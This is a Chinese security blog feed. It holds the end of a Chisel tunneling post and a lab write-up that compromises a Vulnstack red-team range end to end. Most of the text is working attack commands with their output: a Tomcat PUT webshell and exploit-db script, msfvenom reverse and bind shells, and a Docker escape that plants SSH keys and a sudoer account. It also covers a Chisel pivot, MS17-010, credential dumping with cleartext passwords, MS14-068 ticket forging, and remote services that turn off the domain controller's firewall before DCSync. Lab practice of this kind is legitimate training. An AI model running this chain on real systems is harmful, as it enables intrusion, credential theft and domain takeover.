IP</span><br></pre></td></tr></table></figure><p>如果 <code>server1</code> 上启动 <code>Chisel</code> 的 <code>client</code> 模式，且 <code>LANIP</code> 为 <code>server1</code> 的 <code>IP</code> 时，<code>server1</code> 的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code> 端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-143105.jpg" alt="img"></p><p>如果 <code>server1</code> 上运行 <code>Chisel</code> 的 <code>client</code> 模式，但 <code>LANIP</code> 为 <code>server2</code> 的 <code>IP</code> 时，通过 <code>server1</code> 把<code>server2</code>的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code>端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-151947.jpg" alt="img"></p><p>从第二种用法可以看出 Chisel 的端口转发功能比 lcx 更强大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html" target="_blank" rel="noopener">Tunneling with Chisel and SSF</a></p><p><a href="https://runsisi.com/2019-09-21/chisel-proxy" target="_blank" rel="noopener">https://runsisi.com/2019-09-21/chisel-proxy</a></p><p><a href="https://runsisi.com/2019-09-20/chisel-reverse-proxy" target="_blank" rel="noopener">https://runsisi.com/2019-09-20/chisel-reverse-proxy</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github
      
    
    </summary>
    
    
      <category term="Tools" scheme="http://mysecroad.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://mysecroad.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK实战系列四</title>
    <link href="http://mysecroad.github.io/posts/50306.html"/>
    <id>http://mysecroad.github.io/posts/50306.html</id>
    <published>2020-05-16T08:17:49.000Z</published>
    <updated>2020-05-16T08:31:43.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络拓扑如下：</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png" alt="ATT-CK-2.png"></p><p>IP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali linux  192.168.150.141</span><br><span class="line">web(ubuntu) 192.168.150.160(外) 192.168.183.128(内)</span><br><span class="line">win7        192.168.183.129</span><br><span class="line">DC(win2008) 192.168.183.130</span><br></pre></td></tr></table></figure><p>进入<code>WEB</code>主机，需要手动使用<code>docker</code>开启服务，分别是<code>strtus2-045</code>、<code>cve-2017-12615</code>、<code>cve-2018-12613</code><br>使用<code>docker</code>需要使用<code>sudo</code>否则没有权限使用，开启后情况如下</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>我们先用<code>nmap</code>扫一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br></pre></td></tr></table></figure><p>扫描结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;nmap# nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br><span class="line">Failed to open normal output file nmap&#x2F;vulnstack4.nmap for writing</span><br><span class="line">QUITTING!</span><br><span class="line">root@kali:~&#x2F;nmap# cd ..</span><br><span class="line">root@kali:~# nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-15 09:40 CST</span><br><span class="line">Nmap scan report for 192.168.150.160</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6d:1e:e7:55:ee:d7:2b:22:d7:6b:68:67:df:39:f5:7b (DSA)</span><br><span class="line">|   2048 5e:ca:2c:70:8f:a2:0c:bf:10:d7:26:2b:15:5f:3f:58 (RSA)</span><br><span class="line">|   256 de:b5:6a:a8:24:6a:13:45:cc:87:21:c3:c2:ee:b2:10 (ECDSA)</span><br><span class="line">|_  256 8e:02:ca:99:6e:c2:eb:8f:0c:5c:bb:c9:b2:f5:06:4d (ED25519)</span><br><span class="line">2002&#x2F;tcp open  http    Apache Tomcat 8.5.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat&#x2F;8.5.19</span><br><span class="line">MAC Address: 00:0C:29:57:73:39 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds</span><br></pre></td></tr></table></figure><p>访问<code>http://192.168.150.160:2002/</code>发现是<code>Tomcat</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png" alt="Tomcat"></p><p>利用<code>CVE-2017-12615</code>直接<code>put</code>一个冰蝎马上去</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png" alt="attck4-3.png"></p><p>这里有几点需要<strong>注意</strong>的：</p><ol><li>将<code>GET</code>请求改为<code>PUT</code></li><li>上传<code>shell</code>的名称后面需要加上<code>/</code>，比如，<code>/shell.jsp/</code></li><li>在最后加上要上传的内容，即shell</li></ol><p>访问<code>http://192.168.150.160:2002/shell.jsp</code>，<code>shell</code>已经成功上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png" alt="attck4-4.png"></p><p>使用冰蝎成功连接，是<code>root</code>权限</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck45.png" alt="attck45.png"></p><h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>首先搜索一下<code>apache tomcat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit apache tomcat</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                              |  Path</span><br><span class="line">                                                                                            | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                  | exploits&#x2F;cgi&#x2F;webapps&#x2F;35035.txt</span><br><span class="line">Apache 1.3.x + Tomcat 4.0.x&#x2F;4.1.x mod_jk - Chunked Encoding Denial of Service               | exploits&#x2F;unix&#x2F;dos&#x2F;22068.pl</span><br><span class="line">Apache Commons FileUpload and Apache Tomcat - Denial of Service                             | exploits&#x2F;multiple&#x2F;dos&#x2F;31615.rb</span><br><span class="line">Apache Tomcat (Windows) - &#39;runtime.getRuntime().exec()&#39; Local Privilege Escalation          | exploits&#x2F;windows&#x2F;local&#x2F;7264.txt</span><br><span class="line">......</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal                                         | exploits&#x2F;unix&#x2F;remote&#x2F;14489.c</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal (PoC)                                   | exploits&#x2F;multiple&#x2F;remote&#x2F;6229.txt</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;windows&#x2F;webapps&#x2F;42953.txt</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck47.png" alt="attck47.png"></p><p>找到一个可用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br></pre></td></tr></table></figure><p>将payload复制到当前目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit -m exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">  Exploit: Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote Code Execution (2)</span><br><span class="line">      URL: https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;42966</span><br><span class="line">     Path: &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">File Type: Python script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: &#x2F;root&#x2F;42966.py</span><br></pre></td></tr></table></figure><p>然后可以使用<code>42966.py</code>脚本</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck48.png" alt="attck48.png"></p><p>用<code>-u</code>参数检测是否存在漏洞</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck49.png" alt="attck49.png"></p><p>存在漏洞，访问<code>http://192.168.150.160:2002/Poc.jsp</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck410.png" alt="attck410.png"></p><p>我们就用自带的工具利用漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http:&#x2F;&#x2F;192.168.150.160:2002&#x2F; -p pwn</span><br></pre></td></tr></table></figure><p>!<img src="http://www.sectime.top:8888/images/2020/05/15/attck411.png" alt="attck411.png"></p><p>可看到成功了，并返回一个shell</p><p>然后我们去访问上传的<code>pwn.jsp</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck412.png" alt="attck412.png"></p><p>在输入框中可执行命令</p><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>参考：<a href="https://daolgts.github.io/2019/10/07/docker安全/" target="_blank" rel="noopener">docker安全</a></p><p>使用<code>cve-2019-5736</code>实现<code>docker</code>逃逸  <a href="https://github.com/Frichetten/CVE-2019-5736-PoC" target="_blank" rel="noopener">EXP</a></p><p>下载后编辑<code>main.go</code>，将命令改为如下反弹<code>shell</code>命令</p><p>6</p><p>使用<code>go</code>语言编译，得到<code>main</code>文件</p><p>通过冰蝎上传<code>main</code>文件，一执行就卡死，于是反弹<code>shell</code>到<code>kali</code><br>使用冰蝎反弹<code>shell</code>到<code>msf</code>，反弹<code>meterpreter</code>发现进不了<code>shell</code>也无法执行文件，直接反弹<code>shell</code>不能接收</p><p>于是使用另外的方式反弹<code>shell</code>，首先使用<code>msf</code>生成一个反弹<code>shell</code>的后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.150.141 LPORT&#x3D;5555 -f raw &gt; shell1.jsp</span><br></pre></td></tr></table></figure><p>然后将它通过冰蝎上传到网站根目录<code>/usr/local/tomcat/webapps/ROOT/</code>，执行成功反弹<code>shell</code>，然后运行<code>main</code></p><p>输入框中执行<code>ls /dev</code>，可以看到docker虚拟的硬盘</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck413.png" alt="attck412.png"></p><p>我们试一下挂载</p><p>在根目录创建一个<code>test</code>文件夹，<code>mkdir /test</code></p><p><code>mount /dev/sda1 /test</code>，看一下是否挂载成功，<code>ls /test</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck414.png" alt></p><p>挂载成功</p><p>我们查看一下<code>/home</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck415.png" alt></p><p>查看隐藏文件，<code>ls -lah /test/home/ubuntu</code>，可以看到<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck416.png" alt></p><p>查看<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck417.png" alt></p><p>接下来我们就利用ssh实现docker逃逸</p><p><code>ssh-keygen -f kali</code>生成私钥</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck418.png" alt></p><p><code>chmod 600 kali</code>，不然用不了</p><p>这里我们写一个<code>test.sh</code>脚本，方便执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl13XtnQ&#x2F;CEiD7SZLBXR8sbpEb7aXb3CMMpCZabybfg1eXitxiT+V7ypF1v8yjlRVGk7LqVeCD1nGI5d&#x2F;VaDSW3fqe6fxZBH+8nAuuWbt6oEdkndaDuPgSHBZSkGJDQsePq9WOQ1tNUx7v2Jg7pMuIdd9kTQOVgK4xL2KGxddTwmpJCkv1gNn6Vd99ASWLIRKPNYdLvQ4lGAn6gPz39LBfDXaU8ri93HA75IIzz+7nXETfkx6x82vr0GuEmJBmqRRHxAQo8zAl3XC+X&#x2F;tkPrSCr4OH26Rt3dQ9EL+eJJI8hSpWxGfC2uvauFQ8Brx+SuSnUAO9RevbAUyQDXyuI8LXu3vJL2Grw2tb9FDsIAEHtHUZ8o4od6xhyWThiv2hrL8nKHXzpuypTZ6WCznP6inYaCOFpChtU01kHptmzBreNy33HveKxMjKd5338dB4zSaIaaNqPKizjoejk7oRBJkuGyqecrwL3ReToj+FM02QnjK1kESpEspMTuOF5m6vwL0&#x3D; kali@kali&#39; &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">cat &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><p>保存，开启一个http服务，在目标下载</p><p><code>python -m SimpleHTTPServer</code></p><p>在输入框下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.150.141:8000&#x2F;test.sh</span><br></pre></td></tr></table></figure><p><code>chmod 777 test.sh</code> ，<code>ls -la</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck419.png" alt></p><p>执行<code>test.sh</code>，<code>bash test.sh</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck420.png" alt></p><p>在<code>kali</code>上用<code>ssh</code>连接一下，并没有什么用，因为我们不知道密码。。。。</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck421.png" alt></p><p>那么我们该怎么办呢？可以添加用户，但不能在输入框中添加，否则添加用户到了<code>docker</code></p><p>这里我们可以修改配置文件也可以添加用户</p><p>写个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;passwd</span><br><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;shadow</span><br><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;sudoers</span><br><span class="line">mkdir &#x2F;test&#x2F;home&#x2F;kali</span><br><span class="line">chmod 777 &#x2F;test&#x2F;home&#x2F;kali</span><br><span class="line">echo &#39;kali:x:1001:1000:kali,,,:&#x2F;home&#x2F;kali:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;passwd</span><br><span class="line">echo &#39;kali:$6$dZhS1PQKuhRB3dMq$GVQsHMiD7221rqrnfxGxP6X9Pn271DJ2N299OHzWPoR6SmSQnk7mSK96BP9ZETvqkfFs1HFbMWkxD9kCSX10H1:18397:0:99999:7:::&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;shadow</span><br><span class="line">echo &#39;kali  ALL&#x3D;(ALL:ALL)  ALL&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;sudoers</span><br><span class="line">cat &#x2F;test&#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p>输入框下载，<code>chomd 777 adduser.sh</code>，执行<code>bash adduser.sh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck422.png" alt></p><p>在<code>kali</code>上登录</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck423.png" alt></p><p>这里需要注意几点：</p><ol><li><code>ssh -i kali ubuntu@192.168.150.160</code>必须在<code>kali</code>上的<code>kali</code>用户下执行</li><li><code>sudoers</code>文件的权限只能是只读，上面我们改成<code>777</code>，需要把它改成<code>440</code></li><li><code>sudo -s</code>提升权限到<code>root</code></li></ol><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>利用<code>chisel</code>搭建代理</p><p><a href="https://xax007.github.io/2019/04/12/pivoting-with-chisel.html" target="_blank" rel="noopener">https://xax007.github.io/2019/04/12/pivoting-with-chisel.html</a></p><p>目标机器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ .&#x2F;chisel server -p 9001 --socks5</span><br></pre></td></tr></table></figure><p>kali</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# .&#x2F;chisel client 192.168.150.160:9001 socks</span><br></pre></td></tr></table></figure><p>上大杀器<code>metasploit</code>，利用<code>ms17-010</code>，返回<code>meterpreter</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck443.png" alt="attck443.png"></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>getuid</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p><code>ps</code>查看应用创建的服务</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck424.png" alt="attck424.png"></p><p>输入<code>shell</code>，进入系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2108 created.</span><br><span class="line">Channel 1 created.</span><br></pre></td></tr></table></figure><p><code>net view</code>，存在<code>demo</code>域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view &#x2F;domain</span><br><span class="line">net view &#x2F;domain</span><br><span class="line">Domain</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DEMO                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net view /domain:demo</code>查看域内机器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view &#x2F;domain:demo</span><br><span class="line">net view &#x2F;domain:demo</span><br><span class="line">Server Name            Remark</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">\\TESTWIN7-PC   </span><br><span class="line">\\WIN-ENS2VR5TR3N                                                              </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net group &quot;domain ontrollers&quot; /domain</code>查看域控</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck425.png" alt="attck425.png"></p><p>出现这种情况，首先<code>exit</code>退出shell，然后<code>steal_token 进程号</code> ，再<code>shell</code>进入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck426.png" alt="attck426.png"></p><p>域控：\\WIN-ENS2VR5TR3N </p><p><code>wmic computersystem get domain</code>查看完整域名</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck427.png" alt="attck427.png"></p><p><code>net group &quot;domain admins&quot; /domain</code>查看域内管理员</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck428.png" alt="attck428.png"></p><p><code>net group &quot;domain users&quot; /domain</code> 查看域内用户</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck429.png" alt="attck429.png"></p><p><code>nslookup \\WIN-ENS2VR5TR3N</code> 查看域控IP</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck430.png" alt="attck430.png"></p><p><code>whoami /all</code>获取用户<code>SID</code>: <code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck431.png" alt="attck431.png"></p><p>域的<code>SID</code>，用户<code>SID</code>去掉最后的<code>-</code>及其后面的，即<code>S-1-5-21-979886063-1111900045-1414766810</code></p><p>信息收集到这就差不多了，当然越详细越好。</p><p><strong>抓密码</strong></p><p><code>rev2self</code>提升权限，调用<code>kiwi</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck432.png" alt="attck432.png"></p><p><code>creds_all</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck433.png" alt="attck433.png"></p><p><strong>注意：</strong> 因为登录过域成员，所以密码是明文</p><p>如果没有登录过，可以用上面的<code>NTLM hash</code></p><p><code>systeminfo</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck434.png" alt="attck434.png"></p><p>我们可以利用<code>mss14-068</code>，搜索其补丁号，若没有打补丁，说明漏洞存在</p><p>这个靶场做的很贴心，里面有很多工具，若没有，我们可以自己上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck435.png" alt="attck435.png"></p><p>开搞！！！</p><p>假如我们想查看域控的C盘根目录<code>dir \\WIN-ENS2VR5TR3N\c$</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck436.png" alt="attck436.png"></p><p>发现不行，我们要使用<code>MS17-068</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck437.png" alt="attck437.png"></p><p>生成了一个票据，用<code>mimikatz</code>导入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck438.png" alt="attck438.png"></p><p>再次执行<code>dir \\WIN-ENS2VR5TR3N\c$</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck439.png" alt="attck439.png"></p><p>远程执行命令</p><p>创建关闭防火墙的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ProtectFirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck440.png" alt="attck440.png"></p><p>制作反弹shell木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;6001 -f exe-service -o update.exe</span><br></pre></td></tr></table></figure><p>上传到域成员douser，查看当前目录<code>pwd</code>，<code>upload update.exe</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck445.png" alt="attck445.png"></p><p>创建反弹shell服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create Shell binpath&#x3D; &quot;C:\update.exe&quot;</span><br></pre></td></tr></table></figure><p>设置监听，先不执行</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck444.png" alt="attck444.png"></p><p>执行关闭防火墙的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start ProtectFirewall</span><br></pre></td></tr></table></figure><p>虽然提示失败了，但是防火墙确实关闭了</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck441.png" alt="attck441.png"></p><p>执行反弹shell服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start Shell</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck446.png" alt="attck446.png"></p><p>开启监听，shell弹回来，拿到域控的shell</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck447.png" alt="attck447.png"></p><p>接下来，我们可以抓key，构造黄金令牌</p><p><code>load kiwi</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64&#x2F;windows)</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span><br><span class="line"> ## &#x2F; \ ##  &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ &#x2F; ##       &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz</span><br><span class="line"> &#39;## v ##&#39;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  &#39;#####&#39;         &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com  ***&#x2F;</span><br><span class="line"></span><br><span class="line">Success.</span><br></pre></td></tr></table></figure><p><code>help</code>可以帮助我们查看<code>command</code>文档</p><p><code>dcsync_ntlm</code> 来还原<code>krbtgt</code>的<code>hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span 